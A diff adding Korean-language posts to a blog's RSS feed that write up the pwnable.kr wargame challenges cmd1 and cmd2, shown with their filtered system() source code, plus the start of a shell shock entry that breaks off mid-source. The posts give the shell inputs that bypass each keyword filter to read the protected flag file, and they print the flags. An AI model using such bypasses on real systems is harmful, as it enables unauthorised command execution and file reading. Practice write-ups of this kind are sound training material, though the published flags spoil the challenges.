@@ -6,7 +6,333 @@
         <description>Recent content on SooHo&#39;s Blog</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
-        <lastBuildDate>Wed, 20 Jul 2022 20:33:30 +0900</lastBuildDate><atom:link href="https://appealso.github.io/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Sat, 22 Oct 2022 10:19:30 +0900</lastBuildDate><atom:link href="https://appealso.github.io/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>pwnable.kr cmd2</title>
+        <link>https://appealso.github.io/p/pwnable.kr-cmd2/</link>
+        <pubDate>Sat, 22 Oct 2022 10:19:30 +0900</pubDate>
+        
+        <guid>https://appealso.github.io/p/pwnable.kr-cmd2/</guid>
+        <description>&lt;img src="https://appealso.github.io/p/pwnable.kr-cmd2/pwn.png" alt="Featured image of post pwnable.kr cmd2" /&gt;&lt;p&gt;주어진 링크에 접속하여 파일을 확인해보면 아래와 같은 파일이 주어진다. 이중에서 c파일을 열면 아래와 같은 내용을 확인 할 수 있다.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;n&#34;&gt;cmd2&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;nl&#34;&gt;pwnable&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;~&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;$&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ls&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;cmd2&lt;/span&gt;  &lt;span class=&#34;n&#34;&gt;cmd2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c&lt;/span&gt;  &lt;span class=&#34;n&#34;&gt;flag&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;cmd2&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;nl&#34;&gt;pwnable&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;~&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;$&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cat&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cmd2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c&lt;/span&gt;
+&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;
+&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;filter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cmd&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;
+        &lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+        &lt;span class=&#34;n&#34;&gt;r&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;strstr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cmd&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;=&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+        &lt;span class=&#34;n&#34;&gt;r&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;strstr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cmd&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;PATH&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+        &lt;span class=&#34;n&#34;&gt;r&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;strstr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cmd&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;export&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+        &lt;span class=&#34;n&#34;&gt;r&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;strstr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cmd&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;/&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+        &lt;span class=&#34;n&#34;&gt;r&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;strstr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cmd&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;`&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+        &lt;span class=&#34;n&#34;&gt;r&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;strstr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cmd&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;flag&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+
+&lt;span class=&#34;k&#34;&gt;extern&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;**&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;environ&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;delete_env&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(){&lt;/span&gt;
+        &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;**&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+        &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;environ&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;memset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;strlen&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+
+&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;argc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[],&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;**&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;envp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;
+        &lt;span class=&#34;n&#34;&gt;delete_env&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
+        &lt;span class=&#34;n&#34;&gt;putenv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;PATH=/no_command_execution_until_you_become_a_hacker&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;filter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]))&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+        &lt;span class=&#34;n&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;%s&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt;
+        &lt;span class=&#34;n&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;cmd1에서 사용했던 우회방식은 불가하다고 판단이 들었고, 아래와 같은 방식으로 우회하여 flag를 획득할 수 있었다.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;cmd2@pwnable:~$ ./cmd2 &lt;span class=&#34;s2&#34;&gt;&amp;#34;command -p cat fl*&amp;#34;&lt;/span&gt;
+&lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt; -p cat fl*
+FuN_w1th_5h3ll_v4riabl3s_haha
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
+        </item>
+        <item>
+        <title>pwnable.kr cmd1</title>
+        <link>https://appealso.github.io/p/pwnable.kr-cmd1/</link>
+        <pubDate>Sat, 22 Oct 2022 10:16:43 +0900</pubDate>
+        
+        <guid>https://appealso.github.io/p/pwnable.kr-cmd1/</guid>
+        <description>&lt;img src="https://appealso.github.io/p/pwnable.kr-cmd1/pwn.png" alt="Featured image of post pwnable.kr cmd1" /&gt;&lt;p&gt;주어진 경로에 접속하면 아래와 같이 3가지 파일이 주어진다. 이 중 C파일을 실행하면 아래와 같은 내용의 소스코드를 확인할 수 있다.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;n&#34;&gt;cmd1&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;nl&#34;&gt;pwnable&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;~&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;$&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ls&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;cmd1&lt;/span&gt;  &lt;span class=&#34;n&#34;&gt;cmd1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c&lt;/span&gt;  &lt;span class=&#34;n&#34;&gt;flag&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;cmd1&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;nl&#34;&gt;pwnable&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;~&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;$&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cat&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cmd1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c&lt;/span&gt;
+&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;
+&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;filter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cmd&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;
+        &lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+        &lt;span class=&#34;n&#34;&gt;r&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;strstr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cmd&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;flag&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+        &lt;span class=&#34;n&#34;&gt;r&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;strstr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cmd&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;sh&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+        &lt;span class=&#34;n&#34;&gt;r&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;strstr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cmd&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;tmp&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;argc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[],&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;**&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;envp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;
+        &lt;span class=&#34;n&#34;&gt;putenv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;PATH=/thankyouverymuch&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;filter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]))&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+        &lt;span class=&#34;n&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;코드를 해석해보면 flag,sh,tmp를 필터링 하지만 특수문자는 필터링하지 못하기에 아래와 같은 방식으로 우회하면 flag를 획득 할 수 있었다.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;cmd1@pwnable:~$ ./cmd1 &lt;span class=&#34;s2&#34;&gt;&amp;#34;/bin/cat fl*&amp;#34;&lt;/span&gt;
+mommy now I get what PATH environment is &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; :&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
+        </item>
+        <item>
+        <title>pwnable.kr shell shock</title>
+        <link>https://appealso.github.io/p/pwnable.kr-shell-shock/</link>
+        <pubDate>Sat, 22 Oct 2022 10:06:49 +0900</pubDate>
+        
+        <guid>https://appealso.github.io/p/pwnable.kr-shell-shock/</guid>
+        <description>&lt;img src="https://appealso.github.io/p/pwnable.kr-shell-shock/pwn.png" alt="Featured image of post pwnable.kr shell shock" /&gt;&lt;p&gt;주어진 경로에 접속하면 아래와 같은 파일이 주어진다.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;shellshock@pwnable:~$ ls -al
+total &lt;span class=&#34;m&#34;&gt;980&lt;/span&gt;
+drwxr-x---   &lt;span class=&#34;m&#34;&gt;5&lt;/span&gt; root shellshock       &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; Oct &lt;span class=&#34;m&#34;&gt;23&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2016&lt;/span&gt; .
+drwxr-xr-x &lt;span class=&#34;m&#34;&gt;116&lt;/span&gt; root root             &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; Nov &lt;span class=&#34;m&#34;&gt;11&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt; ..
+-r-xr-xr-x   &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root shellshock     &lt;span class=&#34;m&#34;&gt;959120&lt;/span&gt; Oct &lt;span class=&#34;m&#34;&gt;12&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2014&lt;/span&gt; bash
+d---------   &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; root root             &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; Oct &lt;span class=&#34;m&#34;&gt;12&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2014&lt;/span&gt; .bash_history
+-r--r-----   &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root shellshock_pwn     &lt;span class=&#34;m&#34;&gt;47&lt;/span&gt; Oct &lt;span class=&#34;m&#34;&gt;12&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2014&lt;/span&gt; flag
+dr-xr-xr-x   &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; root root             &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; Oct &lt;span class=&#34;m&#34;&gt;12&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2014&lt;/span&gt; .irssi
+drwxr-xr-x   &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; root root             &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; Oct &lt;span class=&#34;m&#34;&gt;23&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2016&lt;/span&gt; .pwntools-cache
+-r-xr-sr-x   &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root shellshock_pwn   &lt;span class=&#34;m&#34;&gt;8547&lt;/span&gt; Oct &lt;span class=&#34;m&#34;&gt;12&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2014&lt;/span&gt; shellshock
+-r--r--r--   &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root root              &lt;span class=&#34;m&#34;&gt;188&lt;/span&gt; Oct &lt;span class=&#34;m&#34;&gt;12&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2014&lt;/span&gt; shellshock.c
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;파일들 중에 보면 shell shock라는 파일을 확인할 수 있고, 소스코드인 c파일을 먼저 실행하면 아래와 같은 내용을 확인 할 수 있다.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;n&#34;&gt;shellshock&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;nl&#34;&gt;pwnable&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;~&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;$&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cat&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;shellshock&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c&lt;/span&gt;
+&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(){&lt;/span&gt;
